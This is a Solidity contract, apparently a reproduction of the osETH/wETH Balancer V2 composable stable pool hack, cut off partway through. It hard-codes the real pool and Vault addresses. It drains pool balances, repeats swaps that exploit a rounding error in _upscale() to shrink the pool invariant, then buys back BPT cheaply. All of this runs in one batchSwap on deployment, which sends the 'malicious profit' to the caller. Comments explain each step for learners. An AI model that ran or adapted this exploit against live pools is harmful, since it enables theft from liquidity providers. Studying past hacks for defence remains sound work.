// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;
pragma experimental ABIEncoderV2;

import {StableMath} from "./libraries/StableMath.sol";
import {FixedPoint} from "./libraries/FixedPoint.sol";
import {Math} from "./libraries/Math.sol";
import {ExternalFees} from "./libraries/ExternalFees.sol";
import {_upscaleArray, _upscale, _downscaleUp} from "./helpers.sol";
import {IVault, IAsset} from "../interfaces/IVault.sol";
import {IERC20} from "../interfaces/IERC20.sol";

import "forge-std/console.sol";
import {ExploitSwapQuoter} from "./SwapQuoter.sol";
// -------------------------------------------------------------------------
// Balancer 101 (for readers new to Balancer)
// -------------------------------------------------------------------------
//
// Balancer V2 has a central "Vault" contract that holds tokens for ALL pools.
// When you "swap" you call the Vault, and the Vault calls the pool's pricing
// logic (hooks) to compute how many tokens must move.
//
// For batching, Balancer provides `Vault.batchSwap`, where you supply a list of
// swaps. Unlike `swap`, `batchSwap` can perform multiple swaps in sequence and at the end
// computes the net token balance change. Tokens only move at the end of the swaps.
// The Vault:
// - pulls token inputs from sender (via ERC20 `transferFrom`) or sender's internal balance
// - sends token outputs to recipient or recipient's internal balance
//
// This contract reproduces the osETH/wETH hack by calling `batchSwap` once,
// with carefully crafted steps.

/// Reproduction contract for the osETH/wETH composable stable pool exploit sequence.
/// This contract only constructs the exact `batchSwap` call data. It does not hold funds
///      and it executes the exploit on deploy.
contract BalancerHacker {
    using FixedPoint for uint256;

    enum StepResult {
        BreakLoop,
        SkipSwap,
        DidSwap
    }

    // BalancerV2 osETH_wETH_BPT pool, this is the pool we want to hack (hacked in block 23717396)
    IComposableStablePool constant POOL =
        IComposableStablePool(0xDACf5Fa19b1f720111609043ac67A9818262850c);
    // Vault contract, this is the contract that holds the funds of the pool
    IVault constant VAULT =
        IVault(payable(0xBA12222222228d8Ba445958a75a0704d566BF2C8));

    // tokens in the pool
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    // yield token paired with WETH.
    // It is a repricing token: yield is captured by an increasing exchange rate to ETH.
    // So we need its rate to reason about equivalent ETH value in pool math.
    address constant OSETH = 0xf1C9acDc66974dFB6dEcB12aA385b9cD01190E38;
    // the BPT token is the same as the pool address
    address constant BPT = address(POOL);

    // BPT is index 1 in this pool's registered token list.
    uint256 private constant _BPT_INDEX = 1;

    // IMPORTANT: "balances" arrays in this contract are ALWAYS in the Vault's
    // registered token order for this pool, and therefore INCLUDE BPT:
    //
    //   balances[0] = WETH balance
    //   balances[1] = BPT  balance  (special: preminted BPT is held by the Vault)
    //   balances[2] = osETH balance
    //
    // Many StableMath functions operate on arrays that EXCLUDE BPT, because BPT is
    // not an "underlying token" from the invariant's perspective. When we call
    // StableMath, we convert:
    // - arrays via `_dropBptItem(...)`
    // - indices via `_skipBptIndex(...)`

    // Limits used to create the swaps.
    // @note check if  works with construcot execution
    uint256 DEPLETION_SWAPS;
    uint256 EXPLOIT_ROUNDS;
    uint256 constant MAX_BALANCE_FOR_EXPLOIT = 51_268;

    // -----------------------------------------------------------------------------
    //  pool parameters captured at deployment
    // -----------------------------------------------------------------------------

    uint256 AMPLIFICATION_PARAMETER; // used to calculate the invariant of the pool
    bytes32 POOL_ID; // used by the vault to identify the pool
    uint256 SWAP_FEE_PERCENTAGE; // percentage of swap token amount to be paid as fee to liquidity providers
    uint256 PROTOCOL_SWAP_FEE_PERCENTAGE; // percentage of swap fee paid to protocol

    ExploitSwapQuoter private QUOTER;

    // osETH amount used to exploit the rounding error in `_upscale()` in ComposableStablePool.
    // To exploit rounding in `_upscale()`, we want the rate multiplier to have near-zero integer impact.
    //
    // Original derivation notes:
    //
    // TRICK_AMT * scalingFactor = TRICK_AMT
    // TRICK_AMT * scalingFactor - TRICK_AMT = 0
    // TRICK_AMT * (scalingFactor - 1) = 0
    // TRICK_AMT = 0
    //
    // But we can't use zero. So we instead require an effect smaller than 1:
    //
    // TRICK_AMT * scalingFactor < TRICK_AMT + 1
    // TRICK_AMT * (scalingFactor - 1) < 1
    // TRICK_AMT < 1 / (scalingFactor - 1)
    uint256 TRICK_AMT;

    // The exploit is executed on deployment.
    constructor(uint256 _depletionSwaps, uint256 _exploitRounds) {
        DEPLETION_SWAPS = _depletionSwaps;
        EXPLOIT_ROUNDS = _exploitRounds;

        (AMPLIFICATION_PARAMETER, , ) = POOL.getAmplificationParameter();
        PROTOCOL_SWAP_FEE_PERCENTAGE = POOL.getProtocolFeePercentageCache(
            uint256(ProtocolFeeType.SWAP)
        );
        POOL_ID = POOL.getPoolId();
        SWAP_FEE_PERCENTAGE = POOL.getSwapFeePercentage();

        // Refresh cache so scaling factors used below match current token rate conditions.
        //
        // ComposableStablePool supports "rate providers" for tokens whose value changes over time.
        // osETH is repricing, so its cached rate is used in the swap math through scaling factors.
        // Balancer pools update this cache in their `_beforeSwapJoinExit()` hook; we do it manually here.
        POOL.updateTokenRateCache(IERC20(OSETH));

        // Balancer scaling factors:
        // Stable pool math runs on a shared 18-decimal fixed-point domain.
        // Scaling factors convert each token's raw Vault balance into that domain,
        // and for repricing tokens it also incorporates the cached rate into the scaling factor.
        uint256[] memory scalingFactors = POOL.getScalingFactors();
        TRICK_AMT = FixedPoint.ONE.divDown(
            scalingFactors[2].sub(FixedPoint.ONE)
        );
        TRICK_AMT = TRICK_AMT / FixedPoint.ONE; // Drop TRICK_AMT's fixed-point decimals (floor).

        QUOTER = new ExploitSwapQuoter();

        // Execute the exploit immediately on deployment.
        _exploit(msg.sender, block.timestamp + 1000);
    }

    // -----------------------------------------------------------------------------
    // Creates the swaps and executes the exploit.
    // -----------------------------------------------------------------------------
    function _exploit(address sender, uint256 deadline) private {
        // Returns the pool's token balances as stored in the Vault. These BPT balance does not have any ownership of the pool.
        // It is used to facilitate swaps that involve BPT. Swapping a token for BPT is equivalent to a join and vice versa.
        // IMPORTANT: this includes BPT because ComposableStablePool registers BPT as a pool token.
        (, uint256[] memory balances, ) = VAULT.getPoolTokens(POOL_ID);
        uint256[] memory initialBalances = _cloneUint256Array(balances);

        // This array will be used to store all the swaps.
        IVault.BatchSwapStep[] memory allSwaps;
        {
            uint256[] memory scalingFactors = POOL.getScalingFactors();

            // Balancer supply concept:
            // For composable pools, the "useful" supply is not ERC20 totalSupply().
            // The total supply of BPT consists of the virtual supply, unminted protocol fees and the supply in the Vault.
            // So calling totalSupply() will not give us the actual supply of BPT that owns the tokens in the pool.
            // `getActualSupply()` is the pool's (virtual supply + unminted protocol fees) value used in math.
            uint256 bptActualSupply = POOL.getActualSupply();

            // 1) Deplete non-BPT balances with repeated BPT->token swaps.
            //    This creates the low liquidity state needed to exploit the rounding error in _upscale().
            IVault.BatchSwapStep[] memory depletionSwaps;
            (bptActualSupply, depletionSwaps) = _createDepletionSwaps(
                balances,
                bptActualSupply,
                scalingFactors
            );

            // 2) Run the core 3-step rounding sequence repeatedly.
            //    This is the part that exploits the rounding error in _upscale().
            //    It reduces the invariant of the pool with each exploit round.
            //    But the invariant is directly proportional to the actual supply of BPT.
            //    Since the invriant decreases without a proportional decrease in the actual supply of BPT,
            //    the price of BPT will decrease.
            //    Before this call the user owes a lot of BPT to the pool.
            //    After this call the user owes the same amount of BPT to the pool but at a lesser price,
            //    so he can pay less wETH and osETH to the pool to cover the BPT debt.
            //    E.g. if he owed 100 BPT to the pool at 1 wETH/BPT, after this call he still owes 100 BPT to the pool
            //         but at 0.5 wETH/BPT, so he can pay less wETH to the pool to cover the BPT debt.
            IVault.BatchSwapStep[] memory exploitSwaps = _createExploitSwaps(
                balances,
                scalingFactors
            );

            // 3) Refill by using the tokens the user sent out in the depletion swaps to buy back BPT.
            //    This is done by swapping the tokens the user sent out in the depletion swaps for BPT.
            //    At the end of these swaps we will get the remaining tokens in assetDelta after paying back
            //    the BPT debt.
            //    E.g. if we sent out 100 wETH and 100 osETH in the depletion swaps,
            //         we may need to pay back 1 wETH and 2 osETH to the pool to cover the BPT debt.
            //         We'll get the remaining 99 wETH and 98 osETH as malicious profit 😈.

            IVault.BatchSwapStep[] memory fillupSwaps;
            (bptActualSupply, fillupSwaps) = _createFillupSwaps(
                balances,
                initialBalances[_BPT_INDEX],
                bptActualSupply,
                scalingFactors
            );

            // Concatenate all phases into one batch.
            allSwaps = new IVault.BatchSwapStep[](
                depletionSwaps.length.add(exploitSwaps.length).add(
                    fillupSwaps.length
                )
            );

            for (uint256 i = 0; i < depletionSwaps.length; ++i) {
                allSwaps[i] = depletionSwaps[i];
            }
            for (uint256 i = 0; i < exploitSwaps.length; ++i) {
                allSwaps[depletionSwaps.length + i] = exploitSwaps[i];
            }
            for (uint256 i = 0; i < fillupSwaps.length; ++i) {
                allSwaps[
                    depletionSwaps.length + exploitSwaps.length + i
                ] = fillupSwaps[i];
            }
        }

        console.log("Exploit Profit");
        console.log("WETH profit", initialBalances[0] - balances[0]);
        console.log("osETH profit", initialBalances[2] - balances[2]);
        console.log("BPT owed", initialBalances[1] - balances[1]);

        // Balancer `batchSwap`:
        // `SwapKind.GIVEN_OUT` means every step fixes the amount OUT (the `amount` field),
        // and the Vault computes how much IN is required to pay (including swap fee).
        //
        // FundManagement struct controls asset movement:
        // - sender: address that provides the tokens to be swapped (here, this contract)
        // - fromInternalBalance: whether to pull tokens from the sender's internal balance on the Vault (false = use external/normal balance)
        // - recipient: address that receives the tokens from the swaps (here, the original sender/caller)
        // - toInternalBalance: whether swapped-out tokens go into the recipient's internal balance on the Vault (true = store internally)
        VAULT.batchSwap(
            IVault.SwapKind.GIVEN_OUT,
            allSwaps,
            _poolAssets(),
            IVault.FundManagement({
                sender: address(this),
                fromInternalBalance: false,
                recipient: payable(sender),
                toInternalBalance: true
            }),
            _maxLimits(),
            deadline
        );
    }

    function _poolAssets() private pure returns (IAsset[] memory assets) {
        // `assets` defines the token universe for batchSwap.
        // Each BatchSwapStep refers to tokens by these indices.
        // For pool correctness we keep the pool-registered token order: WETH, BPT, osETH.
        assets = new IAsset[](3);
        assets[0] = IAsset(WETH);
        assets[1] = IAsset(BPT);
        assets[2] = IAsset(OSETH);
    }

    function _maxLimits() private pure returns (int256[] memory limits) {
        // `limits` is required by the Vault as a slippage/safety parameter.
        // Positive limits mean "max amount you are willing to send in" per asset.
        // Negative limits mean "minimum amount you are willing to receive out" per asset.
        // Setting 0 for all assets means we don't want to send in any assets but we want to freely receive 😈.

        limits = new int256[](3); // all limits are set to 0 by default
    }

    // -----------------------------------------------------------------------------
    // Depletion phase
    // -----------------------------------------------------------------------------
    //
    // Creates the depletion swaps.
    // Depletion swaps are swaps that deplete the pool of its non-BPT balances: you can call them exit swaps.
    // This is done by swapping BPT for a token.
    function _createDepletionSwaps(
        uint256[] memory balances,
        uint256 bptActualSupply,
        uint256[] memory scalingFactors
    ) private returns (uint256, IVault.BatchSwapStep[] memory finalSwaps) {
        IVault.BatchSwapStep[] memory swaps = new IVault.BatchSwapStep[](
            DEPLETION_SWAPS
        );

        // We cannot simply swap out the osETH amount and wETH amount in one go to deplete the pool.
        // If we do that the Newton Raphson calculations in Balancer StableMath's `_calculateInvariant()` will not converge.
        // So in each swap we swap out as much as possible alternately for osETH and WETH until they are each
        // less than or equal to MIN_BALANCE_FOR_SWAP.
        //
        // E.g. if we have 100 osETH and 100 WETH, we swap BPT for 10 osETH in the first swap, then BPT for 10 WETH in the second swap.
        // We continue this process until we have swapped out the needed amounts for each token.

        for (uint256 i = 0; i < DEPLETION_SWAPS; ++i) {
            IVault.BatchSwapStep memory step;
            (bptActualSupply, step) = _buildDepletionSwapStep(
                balances,
                bptActualSupply,
                scalingFactors,
                i % 2 == 0 ? 2 : 0
            );

            swaps[i] = step;
        }

        require(
            balances[0] == MAX_BALANCE_FOR_EXPLOIT,
            "wETH not depleted to MAX_BALANCE_FOR_EXPLOIT "
        );
        require(
            balances[2] == MAX_BALANCE_FOR_EXPLOIT,
            "osETH not depleted to MAX_BALANCE_FOR_EXPLOIT"
        );

        return (bptActualSupply, swaps);
    }

    function _buildDepletionSwapStep(
        uint256[] memory balances,
        uint256 bptActualSupply,
        uint256[] memory scalingFactors,
        uint256 assetOutIndex
    ) private returns (uint256, IVault.BatchSwapStep memory) {
        uint256 amountOut = _calcAmountOut(balances[assetOutIndex]);
        uint256 bptAmountIn;
        uint256 nextBptActualSupply;

        // Compute BPT amount in the same way as `_exitSwapExactTokenOutForBptIn()`
        //
        // Balancer concept:
        // In a ComposableStablePool, swapping BPT <-> token is equivalent to a join/exit.
        // Here we're building an "exit" step:
        // - tokenOut is WETH or osETH
        // - tokenIn  is BPT
        // - swap kind is GIVEN_OUT, so `amountOut` is fixed
        //
        // To price that exit, Balancer uses StableMath with:
        // - upscaled balances (18-decimal, rate-adjusted)
        // - balances array with BPT removed
        // - actual/virtual supply (BPT supply outside the Vault, plus unminted fees)

        // Scoped to keep stack usage low.
        {
            uint256 preJoinExitInvariant;

            // Scope 1: compute `bptAmountIn` + the "pre" invariant.
            {
                uint256 scaledAmountOut = _upscale(
                    amountOut,
                    scalingFactors[assetOutIndex]
                );

                // Build the "no BPT" arrays directly to keep stack usage low.
                // (WETH=0, BPT=1, osETH=2) -> (WETH=0, osETH=1)
                uint256[] memory scaledBalancesWithoutBpt = new uint256[](2);
                scaledBalancesWithoutBpt[0] = _upscale(
                    balances[0],
                    scalingFactors[0]
                );
                scaledBalancesWithoutBpt[1] = _upscale(
                    balances[2],
                    scalingFactors[2]
                );

                uint256[] memory scaledAmountsOutWithoutBpt = new uint256[](2);
                scaledAmountsOutWithoutBpt[
                    _skipBptIndex(assetOutIndex)
                ] = scaledAmountOut;

                preJoinExitInvariant = StableMath._calculateInvariant(
                    AMPLIFICATION_PARAMETER,
                    scaledBalancesWithoutBpt
                );

                bptAmountIn = StableMath._calcBptInGivenExactTokensOut(
                    AMPLIFICATION_PARAMETER,
                    scaledBalancesWithoutBpt,
                    scaledAmountsOutWithoutBpt,
                    bptActualSupply,
                    preJoinExitInvariant,
                    SWAP_FEE_PERCENTAGE
                );
            }

            // Scope 2: apply protocol fee accounting (keep Scope 1 temps out of scope).
            {
                uint256 scaledAmountOut = _upscale(
                    amountOut,
                    scalingFactors[assetOutIndex]
                );

                int256[] memory scaledBalanceChanges = new int256[](3);
                scaledBalanceChanges[_BPT_INDEX] = int256(bptAmountIn);
                scaledBalanceChanges[assetOutIndex] = -int256(scaledAmountOut);

                uint256[] memory scaledBalances = _cloneUint256Array(balances);
                _upscaleArray(scaledBalances, scalingFactors);
                (, nextBptActualSupply) = _applySwapAndFees(
                    scaledBalances,
                    scaledBalanceChanges,
                    preJoinExitInvariant,
                    bptActualSupply
                );
            }
        }

        // Update unscaled balances used for the next depletion swap iteration.
        balances[assetOutIndex] = balances[assetOutIndex].sub(amountOut);
        balances[_BPT_INDEX] = balances[_BPT_INDEX].add(bptAmountIn);

        return (
            nextBptActualSupply,
            IVault.BatchSwapStep({
                poolId: POOL_ID,
                assetInIndex: _BPT_INDEX,
                assetOutIndex: assetOutIndex,
                amount: amountOut,
                userData: new bytes(0)
            })
        );
    }

    // -----------------------------------------------------------------------------
    // Exploit phase
    // -----------------------------------------------------------------------------

    function _createExploitSwaps(
        uint256[] memory balances,
        uint256[] memory scalingFactors
    ) private view returns (IVault.BatchSwapStep[] memory swaps) {
        swaps = new IVault.BatchSwapStep[](EXPLOIT_ROUNDS * 3);

        for (uint256 i = 0; i < EXPLOIT_ROUNDS * 3; i += 3) {
            // Step 1: WETH -> osETH, leave TRICK_AMT+1 osETH in pool.
            swaps[i] = IVault.BatchSwapStep({
                poolId: POOL_ID,
                assetInIndex: 0,
                assetOutIndex: 2,
                amount: balances[2].sub(TRICK_AMT + 1),
                userData: new bytes(0)
            });
            _quoteAndApplyExploitSwap(balances, scalingFactors, swaps[i]);

            // Step 2: WETH -> osETH with TRICK_AMT to trigger rounding edge.
            //         With TRICK_AMT we trigger the rounding error in _upscale().
            //         This causes it to use a lesser amountOut to calculate the amountIn
            //         and we end up with a lesser amount than is required to cover TRICK_AMT.
            //         Reducing the liquidity of the pool and thus the invariant.
            //         This is the key to the exploit.
            swaps[i + 1] = IVault.BatchSwapStep({
                poolId: POOL_ID,
                assetInIndex: 0,
                assetOutIndex: 2,
                amount: TRICK_AMT,
                userData: new bytes(0)
            });
            _quoteAndApplyExploitSwap(balances, scalingFactors, swaps[i + 1]);

            // Step 3: osETH -> WETH to have enough osETH in the pool to cover the next exploit round.
            (uint256 wethOut, uint256 osEthInWithFee) = _findSafeRecycleWethOut(
                balances,
                scalingFactors
            );
            swaps[i + 2] = IVault.BatchSwapStep({
                poolId: POOL_ID,
                assetInIndex: 2,
                assetOutIndex: 0,
                amount: wethOut,
                userData: new bytes(0)
            });
            // Reuse the quote computed while searching for a safe `wethOut`.
            _applyExploitSwapWithKnownIn(
                balances,
                swaps[i + 2],
                osEthInWithFee
            );
        }
    }

    function _quoteAndApplyExploitSwap(
        uint256[] memory balances,
        uint256[] memory scalingFactors,
        IVault.BatchSwapStep memory swap
    ) private view {
        (bool ok, uint256 amountInWithFee) = _tryQuoteAmountInWithFee(
            balances,
            scalingFactors,
            swap
        );
        require(ok, "QUOTE_DIDNT_CONVERGE");

        balances[swap.assetInIndex] = balances[swap.assetInIndex].add(
            amountInWithFee
        );
        balances[swap.assetOutIndex] = balances[swap.assetOutIndex].sub(
            swap.amount
        );
    }

    function _applyExploitSwapWithKnownIn(
        uint256[] memory balances,
        IVault.BatchSwapStep memory swap,
        uint256 amountInWithFee
    ) private pure {
        balances[swap.assetInIndex] = balances[swap.assetInIndex].add(
            amountInWithFee
        );
        balances[swap.assetOutIndex] = balances[swap.assetOutIndex].sub(
            swap.amount
        );
    }

    function _tryQuoteAmountInWithFee(
        uint256[] memory balances,
        uint256[] memory scalingFactors,
        IVault.BatchSwapStep memory swap
    ) private view returns (bool ok, uint256 amountInWithFee) {
        uint256 tokenInIndex;
        uint256 tokenOutIndex;
        if (swap.assetInIndex == 0) tokenInIndex = 0;
        else if (swap.assetInIndex == 2) tokenInIndex = 1;
        else revert("BAD_ASSET_IN");

        if (swap.assetOutIndex == 0) tokenOutIndex = 0;
        else if (swap.assetOutIndex == 2) tokenOutIndex = 1;
        else revert("BAD_ASSET_OUT");

        try
            QUOTER.quoteAmountInWithFee(
                AMPLIFICATION_PARAMETER,
                SWAP_FEE_PERCENTAGE,
                _dropBptItem(balances),
                _dropBptItem(scalingFactors),
                tokenInIndex,
                tokenOutIndex,
                swap.amount
            )
        returns (uint256 q) {
            return (true, q);
        } catch {
            return (false, 0);
        }
    }

    function _findSafeRecycleWethOut(
        uint256[] memory balances,
        uint256[] memory scalingFactors
    ) private view returns (uint256 wethOut, uint256 osEthInWithFee) {
        // Step 1 needs `osETH >= TRICK_AMT + 2` (strictly > TRICK_AMT + 1).
        uint256 targetOsEthBalance = TRICK_AMT + 2;
        if (balances[2] >= targetOsEthBalance) {
            return (1, 0); // avoid a zero-amount swap
        }

        uint256 maxOut = balances[0].sub(1);
        uint256 candidate = _roundDownTwoSigFigs(maxOut);
        if (candidate == 0) candidate = maxOut;

        // Heuristic:
        // - start from a rounded "nice" amount (two sig figs)
        // - if Newton doesn't converge, step down by 9/10 repeatedly
        // - if it converges but doesn't top up osETH enough, scale up toward maxOut
        uint256 attempts;
        for (attempts = 0; attempts < 32; ++attempts) {
            IVault.BatchSwapStep memory step = IVault.BatchSwapStep({
                poolId: POOL_ID,
                assetInIndex: 2,
                assetOutIndex: 0,
                amount: candidate,
                userData: new bytes(0)
            });

            (bool ok, uint256 osEthInWithFee) = _tryQuoteAmountInWithFee(
                balances,
                scalingFactors,
                step
            );

            if (!ok) {
                candidate = (candidate * 9) / 10;
                if (candidate == 0) break;
                continue;
            }

            if (balances[2].add(osEthInWithFee) >= targetOsEthBalance) {
                return (candidate, osEthInWithFee);
            }

            // Need more osETH-in: try a larger WETH-out (but don't exceed maxOut).
            if (candidate == maxOut) {
                break;
            }

            uint256 needed = targetOsEthBalance.sub(balances[2]);
            if (osEthInWithFee == 0) {
                candidate = maxOut;
            } else {
                uint256 scaled = (candidate * needed + osEthInWithFee - 1) /
                    osEthInWithFee;
                if (scaled <= candidate) scaled = candidate + 1;
                candidate = scaled > maxOut ? maxOut : scaled;
            }
        }

        revert("NO_SAFE_RECYCLE_WETH_OUT");
    }

    function _roundDownTwoSigFigs(uint256 x) private pure returns (uint256) {
        if (x < 100) return x;
        uint256 factor = 1;
        while (x >= 100) {
            x /= 10;
            factor *= 10;
        }
        return x * factor;
    }

    // -----------------------------------------------------------------------------
    // Fill-up phase
    // -----------------------------------------------------------------------------

    function _createFillupSwaps(
        uint256[] memory balances,
        uint256 initialBptBalance,
        uint256 bptActualSupply,
        uint256[] memory scalingFactors
    ) private returns (uint256, IVault.BatchSwapStep[] memory) {
        uint256 bptOut = 1;
        uint256 bptOwed = balances[_BPT_INDEX].sub(initialBptBalance);

        // Calculate the number of fillup swaps needed to cover the BPT debt.
        uint256 fillupSwaps = _getFillupSwaps(bptOwed);
        IVault.BatchSwapStep[] memory swaps = new IVault.BatchSwapStep[](
            fillupSwaps
        );

        for (uint256 i = 0; i < fillupSwaps; ++i) {
            uint256 tokenIndexIn = i % 2 == 0 ? 0 : 2;
            bptOut = _calcBptAmountOut(bptOwed, bptOut);
            bptOwed = bptOwed.sub(bptOut);

            IVault.BatchSwapStep memory step;
            (step, bptActualSupply) = _buildFillupSwapStepWithFees(
                balances,
                scalingFactors,
                bptOut,
                bptActualSupply,
                tokenIndexIn
            );
            swaps[i] = step;
        }

        require(bptOwed == 0, "BPT debt not covered");

        return (bptActualSupply, swaps);
    }

    // Creates a fillup swap step and adds protocol fees for the swap to the BPT actual supply.
    function _buildFillupSwapStepWithFees(
        uint256[] memory balances,
        uint256[] memory scalingFactors,
        uint256 bptOut,
        uint256 bptActualSupply,
        uint256 tokenIndexIn
    ) private returns (IVault.BatchSwapStep memory, uint256) {
        (
            IVault.BatchSwapStep memory swap,
            uint256 nextBptActualSupply,
            uint256 lastPostJoinExitInvariant
        ) = _buildFillupSwapStep(
                balances,
                scalingFactors,
                bptOut,
                bptActualSupply,
                tokenIndexIn
            );

        uint256 protocolSwapFees = _getProtocolSwapFees(
            nextBptActualSupply,
            lastPostJoinExitInvariant,
            balances,
            scalingFactors
        );

        return (swap, nextBptActualSupply.add(protocolSwapFees));
    }

    // Creates a fillup swap step.
    function _buildFillupSwapStep(
        uint256[] memory balances,
        uint256[] memory scalingFactors,
        uint256 bptOut,
        uint256 bptActualSupply,
        uint256 tokenIndexIn
    ) private returns (IVault.BatchSwapStep memory, uint256, uint256) {
        // Balancer concept:
        // Token -> BPT swaps in a composable stable pool are "single-token joins".
        // You provide one underlying token, and receive BPT representing a share of the pool.
        //
        // Balancer prices this join using StableMath._calcTokenInGivenExactBptOut:
        // given a desired BPT out amount (GIVEN_OUT swap), compute required token in.
        uint256[] memory scaledBalances = _cloneUint256Array(balances);
        _upscaleArray(scaledBalances, scalingFactors);

        uint256 preJoinExitInvariant = StableMath._calculateInvariant(
            AMPLIFICATION_PARAMETER,
            _dropBptItem(scaledBalances)
        );
        uint256 tokenAmountInScaled = StableMath._calcTokenInGivenExactBptOut(
            AMPLIFICATION_PARAMETER,
            _dropBptItem(scaledBalances),
            _skipBptIndex(tokenIndexIn),
            bptOut,
            bptActualSupply,
            preJoinExitInvariant,
            SWAP_FEE_PERCENTAGE
        );

        int256[] memory scaledBalanceChanges = new int256[](3);
        scaledBalanceChanges[tokenIndexIn] = int256(tokenAmountInScaled);
        scaledBalanceChanges[_BPT_INDEX] = -int256(bptOut);

        // After the amount in has been calculated, this function applies the BPT amount and tokenAmountInScaled to the balances.
        // It also computes the protocol fees owed for this operation and adds it to the BPT actual supply.
        (, bptActualSupply) = _applySwapAndFees(
            scaledBalances,
            scaledBalanceChanges,
            preJoinExitInvariant,
            bptActualSupply
        );

        // Balancer stores "last join/exit invariant" to compute protocol fees at the next join/exit.
        // Returning it in this function lets us mimic that accounting for subsequent steps.
        uint256 lastPostJoinExitInvariant = StableMath._calculateInvariant(
            AMPLIFICATION_PARAMETER,
            _dropBptItem(scaledBalances)
        );

        uint256 tokenAmountIn = _downscaleUp(
            tokenAmountInScaled,
            scalingFactors[tokenIndexIn]
        );
        int256[] memory balanceChanges = new int256[](3);
        balanceChanges[tokenIndexIn] = int256(tokenAmountIn);
        balanceChanges[_BPT_INDEX] = -int256(bptOut);
        _mutateBalances(balances, balanceChanges);

        return (
            IVault.BatchSwapStep({
                poolId: POOL_ID,
                assetInIndex: tokenIndexIn,
                assetOutIndex: _BPT_INDEX,
                amount: bptOut,
                userData: new bytes(0)
            }),
            bptActualSupply,
            lastPostJoinExitInvariant
        );
    }

    // -----------------------------------------------------------------------------
    // Protocol fee accounting
    // -----------------------------------------------------------------------------

    // Computes the protocol fees owed for a fillup swap.
    function _getProtocolSwapFees(
        uint256 bptActualSupply,
        uint256 lastPostJoinExitInvariant,
        uint256[] memory balances,
        uint256[] memory scalingFactors
    ) private view returns (uint256) {
        // ---------------------------------------------------------------------
        // Balancer protocol fee accounting (swap fees)
        // ---------------------------------------------------------------------
        //
        // There are TWO fee layers in Balancer:
        //
        // 1) Swap fee (paid to LPs): `SWAP_FEE_PERCENTAGE`
        //    This fee stays inside the pool as extra token balance and is reflected
        //    as an increase in the invariant.
        //
        // 2) Protocol fee (paid to Balancer DAO): `PROTOCOL_SWAP_FEE_PERCENTAGE`
        //    This is NOT paid as "some of the input token". Instead Balancer mints
        //    BPT to the protocol to represent ownership of a slice of the fee growth.
        //
        // Balancer computes the protocol slice by comparing how much the invariant grew
        // relative to the last join/exit baseline.
        uint256[] memory scaledBalances = _cloneUint256Array(balances);
        _upscaleArray(scaledBalances, scalingFactors);

        uint256 swapFeeGrowthInvariant = StableMath._calculateInvariant(
            AMPLIFICATION_PARAMETER,
            _dropBptItem(scaledBalances)
        );

        if (swapFeeGrowthInvariant > lastPostJoinExitInvariant) {
            uint256 invariantDeltaFromFees = swapFeeGrowthInvariant.sub(
                lastPostJoinExitInvariant
            );
            uint256 protocolOwnershipPercentage = invariantDeltaFromFees
                .divDown(swapFeeGrowthInvariant)
                .mulDown(PROTOCOL_SWAP_FEE_PERCENTAGE);

            return
                ExternalFees.bptForPoolOwnershipPercentage(
                    bptActualSupply,
                    protocolOwnershipPercentage
                );
        }

        return 0;
    }

    // Mirrors ComposableStablePool's post swap join/exit fee handling flow.
    // It applies the balance changes to the balances array, then computes *protocol* fees owed for this operation,
    // and incorporate them into the running "actual supply" value.
    function _applySwapAndFees(
        uint256[] memory balances,
        int256[] memory balanceChanges,
        uint256 preJoinExitInvariant,
        uint256 preJoinExitSupply
    )
        private
        view
        returns (uint256[] memory nextBalances, uint256 nextBptActualSupply)
    {
        // Apply the balance changes to the balances array.
        _mutateBalances(balances, balanceChanges);
        // @note nextBalances is the balances array after the balance changes have been applied.
        nextBalances = balances;

        // Compute the new supply of BPT after the swap.
        uint256 postJoinExitSupply = _applySupplyDelta(
            preJoinExitSupply,
            balanceChanges[_BPT_INDEX]
        );

        // Compute the protocol fees owed for this operation.
        uint256 protocolFeeAmount = _getProtocolFee(
            _dropBptItem(nextBalances),
            preJoinExitInvariant,
            preJoinExitSupply,
            postJoinExitSupply
        );

        // Compute the new actual supply of BPT after the swap by adding the protocol fees to the post join exit supply.
        nextBptActualSupply = postJoinExitSupply.add(protocolFeeAmount);
    }

    // Mirrors `_updateInvariantAfterJoinExit()` logic from ComposableStablePool.
    // The fee calculated here is minted to the protocolFeeCollector.
    function _getProtocolFee(
        uint256[] memory balancesWithoutBpt,
        uint256 preJoinExitInvariant,
        uint256 preJoinExitSupply,
        uint256 postJoinExitSupply
    ) private view returns (uint256) {
        // This mirrors Balancer's internal `_updateInvariantAfterJoinExit()` approach:
        //
        // - `postJoinExitInvariant` is computed from the post-join/exit balances.
        // - If there were no fees, invariant and BPT supply would scale proportionally.
        //   So we compute a "feeless" invariant by multiplying the old invariant by
        //   the supply growth ratio.
        // - Any extra invariant growth is attributed to fees.
        // - Convert that growth into an ownership percentage and then into BPT amount.

        // Compute the invariant of the pool after the swap.
        uint256 postJoinExitInvariant = StableMath._calculateInvariant(
            AMPLIFICATION_PARAMETER,
            balancesWithoutBpt
        );

        // Compute the supply growth ratio by dividing the new BPT supply by the old BPT supply.
        uint256 supplyGrowthRatio = postJoinExitSupply.divDown(
            preJoinExitSupply
        );

        // Compute the feeless invariant by multiplying the old invariant by the supply growth ratio.
        uint256 feelessInvariant = preJoinExitInvariant.mulDown(
            supplyGrowthRatio
        );

        if (postJoinExitInvariant > feelessInvariant) {
            // Compute the invariant delta from fees by subtracting the feeless invariant from the post join exit invariant.
            uint256 invariantDeltaFromFees = postJoinExitInvariant.sub(
                feelessInvariant
            );

            // Compute the protocol ownership percentage by dividing the invariant delta from
            // fees by the post join exit invariant and multiplying by the protocol swap fee percentage.
            uint256 protocolOwnershipPercentage = Math.divDown(
                Math.mul(invariantDeltaFromFees, PROTOCOL_SWAP_FEE_PERCENTAGE),
                postJoinExitInvariant
            );

            // If the protocol ownership percentage is greater than 0, compute the protocol fee amount
            // by calling the `bptForPoolOwnershipPercentage` function.
            if (protocolOwnershipPercentage > 0) {
                return
                    ExternalFees.bptForPoolOwnershipPercentage(
                        postJoinExitSupply,
                        protocolOwnershipPercentage
                    );
            }
        }

        // If the protocol ownership percentage is 0 or feeless invariant is
        // greater than or equal to the post join exit invariant, return 0.
        return 0;
    }

    function _applySupplyDelta(
        uint256 supply,
        int256 bptDelta
    ) private pure returns (uint256) {
        // Balancer composable pool nuance:
        // BPT is itself a pool token sitting inside the Vault. When a user "exits" by swapping BPT in,
        // BPT moves INTO the pool's Vault balance, which means there is LESS BPT outside the pool
        // (lower circulating/virtual supply).
        //
